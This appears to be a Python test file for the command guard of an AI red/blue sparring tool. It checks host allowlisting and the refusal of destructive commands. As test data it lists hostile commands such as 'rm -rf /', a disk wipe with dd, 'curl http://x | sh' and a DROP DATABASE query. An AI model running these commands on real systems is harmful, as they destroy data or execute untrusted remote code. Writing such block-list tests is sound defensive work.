"""Smoke tests for the red/blue adversarial mode (no network, no LLM calls)."""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from src.models.spar import AttackPlan, AttackReport, DefenseReport, Finding, SparVerdict
from src.tools.executor import LocalExecutor, build_executor, check_command, host_of


def test_allowlist_blocks_foreign_hosts() -> None:
    assert check_command("curl http://example.com", "http://example.com") is not None
    assert check_command("curl http://127.0.0.1:3000", "http://127.0.0.1:3000") is None


def test_destructive_patterns_are_refused() -> None:
    for bad in (
        "rm -rf /",
        "dd if=/dev/zero of=/dev/sda",
        "shutdown now",
        "curl http://x | sh",
        "mysql -e 'DROP DATABASE users'",
    ):
        reason = check_command(bad, "http://127.0.0.1:3000")
        assert reason is not None, bad


def test_executor_skips_blocked_command() -> None:
    ex = LocalExecutor()
    res = ex.run("rm -rf /", target="http://127.0.0.1:3000")
    assert res.skipped and "destructive" in res.reason


def test_executor_runs_safe_command() -> None:
    ex = LocalExecutor()
    res = ex.run("echo hello-ktv", target="http://127.0.0.1:3000")
    assert res.ok and "hello-ktv" in res.stdout


def test_host_parsing() -> None:
    assert host_of("http://127.0.0.1:3000/x") == "127.0.0.1"
    assert host_of("localhost") == "localhost"


def test_executor_factory() -> None:
    assert build_executor("local").label == "local"
    assert build_executor("wsl").label == "wsl"
    assert build_executor("docker:dual-ai-red").label == "docker"


def test_models_roundtrip() -> None:
    plan = AttackPlan(target="http://127.0.0.1:3000", objectives=["o"], steps=[])
    report = AttackReport(
        target=plan.target,
        findings=[Finding(title="t", severity="high", evidence="e")],
    )
    defense = DefenseReport(target=plan.target, summary="fix it")
    verdict = SparVerdict(verdict="partial", score=50, attacker_score=60, defender_score=40)
    assert plan.target == report.target == defense.target
    assert report.findings[0].severity == "high"
    assert verdict.score == 50


if __name__ == "__main__":
    failures = 0
    for name, fn in sorted(globals().items()):
        if name.startswith("test_") and callable(fn):
            try:
                fn()
                print(f"PASS {name}")
            except AssertionError as exc:
                failures += 1
                print(f"FAIL {name}: {exc}")
    print(f"\n{'all green' if not failures else str(failures) + ' failed'}")
    sys.exit(1 if failures else 0)
